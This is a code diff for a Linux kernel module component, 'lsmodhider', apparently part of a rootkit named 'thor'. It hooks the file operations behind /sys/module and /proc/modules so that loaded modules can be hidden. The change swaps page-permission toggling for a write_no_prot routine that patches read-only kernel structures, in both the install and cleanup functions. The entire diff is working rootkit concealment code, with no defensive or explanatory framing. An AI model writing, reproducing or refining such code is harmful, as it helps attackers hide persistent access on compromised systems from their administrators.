@@ -53,6 +53,8 @@ int lsmodhider_init(void)
 {
     struct file *filep_sysmodule;
     struct file *filep_procmodules;
+    void *sysmodule_iterate_addr;
+    void *procmodules_read_addr;
 
     filep_sysmodule = filp_open("/sys/module", O_RDONLY, 0);
     if (filep_sysmodule == NULL) {
@@ -68,13 +70,12 @@ int lsmodhider_init(void)
 #else
     orig_sysmodule_iterate = sysmodule_fops->iterate;
 #endif
-    set_addr_rw(sysmodule_fops);
+    sysmodule_iterate_addr = (void*) &thor_sysmodule_iterate;
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
-    sysmodule_fops->readdir = thor_sysmodule_iterate;
+    write_no_prot(&sysmodule_fops->readdir, &sysmodule_iterate_addr, sizeof(void*));
 #else
-    sysmodule_fops->iterate = thor_sysmodule_iterate;
+    write_no_prot(&sysmodule_fops->iterate, &sysmodule_iterate_addr, sizeof(void*));
 #endif
-    set_addr_ro(sysmodule_fops);
 
     filep_procmodules = filp_open("/proc/modules", O_RDONLY, 0);
     if (filep_procmodules == NULL) {
@@ -87,9 +88,8 @@ int lsmodhider_init(void)
 
     orig_procmodules_read = procmodules_fops->read;
 
-    set_addr_rw(procmodules_fops);
-    procmodules_fops->read = thor_procmodules_read;
-    set_addr_ro(procmodules_fops);
+    procmodules_read_addr = (void*) &thor_procmodules_read;
+    write_no_prot(&procmodules_fops->read, &procmodules_read_addr, sizeof(void*));
 
     INIT_LIST_HEAD(&module_list.list);
 
@@ -223,19 +223,17 @@ void clear_module_list(void)
 void lsmodhider_cleanup(void)
 {
     if (sysmodule_fops != NULL && orig_sysmodule_iterate != NULL) {
-        set_addr_rw(sysmodule_fops);
+         void *sysmodule_iterate_addr = orig_sysmodule_iterate;
 #if LINUX_VERSION_CODE < KERNEL_VERSION(3, 10, 0)
-        sysmodule_fops->readdir = orig_sysmodule_iterate;
+        write_no_prot(&sysmodule_fops->readdir, &sysmodule_iterate_addr, sizeof(void*));
 #else
-        sysmodule_fops->iterate = orig_sysmodule_iterate;
+        write_no_prot(&sysmodule_fops->iterate, &sysmodule_iterate_addr, sizeof(void*));
 #endif
-        set_addr_ro(sysmodule_fops);
     }
 
     if (procmodules_fops != NULL && orig_procmodules_read != NULL) {
-        set_addr_rw(procmodules_fops);
-        procmodules_fops->read = orig_procmodules_read;
-        set_addr_ro(procmodules_fops);
+        void *procmodules_read_addr = orig_procmodules_read;
+        write_no_prot(&procmodules_fops->read, &procmodules_read_addr, sizeof(void*));
     }
 
     clear_module_list();
